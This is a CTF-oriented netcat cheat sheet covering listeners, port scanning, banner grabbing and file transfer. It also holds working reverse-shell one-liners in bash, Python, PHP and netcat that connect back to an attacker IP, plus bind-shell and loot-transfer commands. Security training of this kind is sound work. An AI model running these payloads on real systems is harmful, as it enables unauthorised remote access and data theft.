## Networking Swiss Army Knife

Netcat (nc) is a utility for reading and writing data across TCP/UDP connections. In CTFs it's used constantly — catching reverse shells, binding listeners, transferring files, port scanning, and banner grabbing.

---
## Installation
### Linux (Debian/Ubuntu)

```bash
sudo apt update && sudo apt install netcat-openbsd
```
### macOS

```bash
# Pre-installed on macOS — use nc directly
nc --version
```
---
## Basic Syntax
```bash
nc [options] <host> <port>      # connect (client)
nc -lvnp <port>                 # listen (server)
```

---
## Reverse Shells

A reverse shell has the **victim connect back** to your machine.

### 1. Start a Listener (Your Machine)
```bash
nc -lvnp 4444
```

- `-l`: Listen mode
- `-v`: Verbose
- `-n`: Skip DNS resolution
- `-p`: Port to listen on
- **Use case**: Catch any incoming reverse shell

### 2. Trigger on Victim (Pick One)

```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("YOUR_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# netcat (if victim has nc)
nc YOUR_IP 4444 -e /bin/bash

# netcat (no -e flag / OpenBSD version)
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
```

- **Tip**: [revshells.com](https://www.revshells.com/) generates payloads for all languages with your IP/port prefilled

---
## Bind Shells

A bind shell has the **victim listen** and you connect to it.

### 1. Start Bind Shell on Victim
```bash
nc -lvnp 4444 -e /bin/bash
```

### 2. Connect From Your Machine
```bash
nc $IP 4444
```

- **Use case**: When the victim can't reach you (firewall blocks outbound) but you can reach the victim

---
## Upgrading a Shell

Raw netcat shells have no tab-complete, Ctrl+C kills the connection, no job control. Upgrade with Python:

```bash
# On victim (inside nc shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then background the shell: Ctrl+Z
stty raw -echo; fg

# Set terminal dimensions
export TERM=xterm
stty rows 40 cols 160
```

---
## File Transfer

### Send File (From Victim → Your Machine)
```bash
# Your machine (receiver)
nc -lvnp 4444 > received_file

# Victim (sender)
nc YOUR_IP 4444 < file_to_send
```

### Send File (From Your Machine → Victim)
```bash
# Your machine (sender)
nc -lvnp 4444 < file_to_send

# Victim (receiver)
nc YOUR_IP 4444 > received_file
```

- **Use case**: Transfer tools, scripts, or loot without SCP/FTP
- **Note**: No progress indicator; connection closes when transfer finishes

---
## Port Scanning

```bash
nc -zv $IP 1-1000
```

- `-z`: Zero-I/O mode (don't send data, just check if port is open)
- `-v`: Verbose (shows open/closed state)
- **Use case**: Quick manual scan; Nmap is better for large ranges

```bash
# Check a single port
nc -zv $IP 443

# Scan range quietly (redirect stderr for just open ports)
nc -zv $IP 1-65535 2>&1 | grep succeeded
```

---
## Banner Grabbing

```bash
nc $IP 80
```

Then type manually:
```
GET / HTTP/1.0

```

- Press Enter twice to send the request
- **Use case**: Read service banners to identify versions without Nmap

```bash
# Or pipe a request
echo "HEAD / HTTP/1.0\r\n\r\n" | nc $IP 80
```

---
## Common Options Reference

| Option | Description |
| ------ | ----------- |
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p <port>` | Local port |
| `-z` | Zero-I/O mode (port scan / check) |
| `-u` | UDP mode (default is TCP) |
| `-e <program>` | Execute program on connect (not in OpenBSD nc) |
| `-k` | Keep listening after client disconnects |
| `-w <sec>` | Connection timeout in seconds |
| `-q <sec>` | Quit N seconds after EOF on stdin |

---
## Practical Examples

### Catch a Reverse Shell
```bash
nc -lvnp 9001
```

### Transfer a Binary to Victim
```bash
# Your machine
nc -lvnp 4444 < linpeas.sh

# Victim
nc YOUR_IP 4444 > linpeas.sh && chmod +x linpeas.sh
```

### Quick HTTP Banner Grab
```bash
echo -e "GET / HTTP/1.0\r\n\r\n" | nc -w 3 $IP 80
```

### Check if Port is Open
```bash
nc -zv $IP 22 && echo "SSH is open"
```

### Persistent Listener (Keeps Listening After Client Disconnects)
```bash
nc -lvnkp 4444
```

### UDP Listener
```bash
nc -lvnup 4444
```

---
## Output Interpretation

```
Listening on 0.0.0.0 4444
Connection received on 10.10.10.5 52341
bash: no job control in this shell
www-data@victim:/var/www/html$
```

| Field | Meaning |
| ----- | ------- |
| `Listening on 0.0.0.0` | Listener active, waiting for connection |
| `Connection received` | Shell connected back — you're in |
| `www-data@victim` | Current user and hostname on victim |

---
## Tips & Best Practices

1. **Always upgrade the shell** with `python3 -c 'import pty; pty.spawn("/bin/bash")'` — raw nc shells break on Ctrl+C
2. **Use `revshells.com`** to generate payloads — faster than memorizing syntax for every language
3. **`-n` flag avoids DNS delays** — always include it on CTF listeners
4. **Check which `nc` version** is on the victim before using `-e`: OpenBSD nc doesn't support it, use the mkfifo trick instead
5. **Use port 443 or 80** for reverse shells on restricted targets — outbound traffic on these is rarely blocked
6. **Export `TERM=xterm` after upgrade** — fixes issues with `clear`, `vim`, `nano` in upgraded shells
7. **Combine with `sshuttle` or `chisel`** for pivoting after getting a shell

---
## Quick Reference

```bash
# Listener (catch reverse shell)
nc -lvnp 4444

# Reverse shell (bash, from victim)
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Reverse shell (mkfifo, no -e)
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f

# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Send file to victim
nc -lvnp 4444 < tool.sh           # your machine
nc YOUR_IP 4444 > tool.sh         # victim

# Port check
nc -zv $IP 80

# Banner grab
echo -e "GET / HTTP/1.0\r\n\r\n" | nc -w 3 $IP 80
```

---
## Related Tools

- **[Nmap](./Nmap.md)** - Full port scanning; use over nc for anything beyond quick checks
- **sshuttle** - Pivot through SSH tunnel (see README)
- **chisel** - TCP/UDP tunneling for port forwarding
- **socat** - More powerful nc alternative; supports TLS and more protocols

---
## Resources

- [GTFOBins: nc](https://gtfobins.github.io/gtfobins/nc/)
- [revshells.com](https://www.revshells.com/)
- [PayloadsAllTheThings - Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
